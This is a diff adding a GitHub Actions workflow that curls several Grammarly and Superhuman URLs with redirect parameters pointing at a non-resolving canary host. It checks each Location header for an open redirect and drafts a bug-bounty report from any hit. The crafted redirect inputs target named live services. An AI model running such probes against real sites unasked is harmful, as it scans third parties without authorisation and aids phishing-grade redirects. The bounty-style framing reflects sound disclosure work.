@@ -1,0 +1,97 @@
+name: Target Proof Hunt
+
+on:
+  push:
+    paths:
+      - ".github/workflows/proof-hunt.yml"
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  proof:
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Run low-impact redirect proof checks
+        shell: bash
+        run: |
+          set -euo pipefail
+          python - <<'PY'
+          import json, subprocess
+          from urllib.parse import quote
+          canary = 'https://h1-proof-canary.invalid/'
+          tests = [
+              ('grammarly_ad_target', 'https://www.grammarly.com/a?target=' + quote(canary, safe='')),
+              ('grammarly_ad_targetid', 'https://www.grammarly.com/a?target=https%3A%2F%2Fh1-proof-canary.invalid%2F&targetid=1'),
+              ('grammarly_logout_redirect', 'https://www.grammarly.com/logout?redirect_to=' + quote(canary, safe='')),
+              ('grammarly_redirect', 'https://www.grammarly.com/?redirect=' + quote(canary, safe='')),
+              ('superhuman_next', 'https://superhuman.com/?next=' + quote(canary, safe='')),
+              ('settings_redirect', 'https://settings.superhuman.com/?redirect=' + quote(canary, safe='')),
+              ('id_redirect', 'https://id.superhuman.com/?redirect=' + quote(canary, safe='')),
+          ]
+          out=[]
+          for name,url in tests:
+              p=subprocess.run(['curl','-sS','--max-redirs','0','--connect-timeout','8','--max-time','15','-o','/tmp/body','-D','-',url],text=True,capture_output=True)
+              lines=p.stdout.splitlines()
+              status=next((z for z in lines if z.startswith('HTTP/')), '')
+              loc=next((z.split(':',1)[1].strip() for z in lines if z.lower().startswith('location:')), '')
+              item={'name':name,'url':url,'status':status,'location':loc,'exit_code':p.returncode,'stderr':p.stderr[-500:]}
+              item['external_redirect_proof']=loc.startswith(canary)
+              out.append(item)
+              print(json.dumps(item, ensure_ascii=False))
+          json.dump(out,open('proof-results.json','w'),indent=2)
+          PY
+
+      - name: Build report only from demonstrated redirect
+        shell: bash
+        run: |
+          set -euo pipefail
+          python - <<'PY'
+          import json, pathlib
+          rows=json.load(open('proof-results.json'))
+          hits=[x for x in rows if x['external_redirect_proof']]
+          if not hits:
+              pathlib.Path('verified-report.md').write_text('# NO VERIFIED BOUNTY EVIDENCE\n\nNo tested URL returned the external canary in the Location header.\n')
+              raise SystemExit(0)
+          x=hits[0]
+          report='''# Open redirect proof on {base}
+
+## Summary
+The tested endpoint returned an HTTP redirect whose Location header pointed to the attacker-controlled external canary supplied in the query parameter.
+
+## Preconditions
+None beyond access to the public affected URL and ability to supply the tested parameter.
+
+## Steps to Reproduce
+1. Send this GET request without following redirects:
+`{url}`
+2. Inspect the response Location header.
+3. Observe the redirect target shown below.
+
+## Observed Behavior
+`{status}` with `Location: {location}`.
+
+## Expected Behavior
+An external destination supplied by an unauthenticated caller should not be accepted for an open redirect unless explicitly intended and safely allowlisted.
+
+## Evidence
+- Tested URL: `{url}`
+- HTTP status: `{status}`
+- Location: `{location}`
+- Canary: `https://h1-proof-canary.invalid/`
+- Program: Superhuman (formerly Grammarly)
+'''.format(base=x['url'].split('?')[0],url=x['url'],status=x['status'],location=x['location'])
+          pathlib.Path('verified-report.md').write_text(report)
+          PY
+
+      - name: Upload proof and report
+        uses: actions/upload-artifact@v4
+        with:
+          name: verified-proof-report
+          path: |
+            proof-results.json
+            verified-report.md
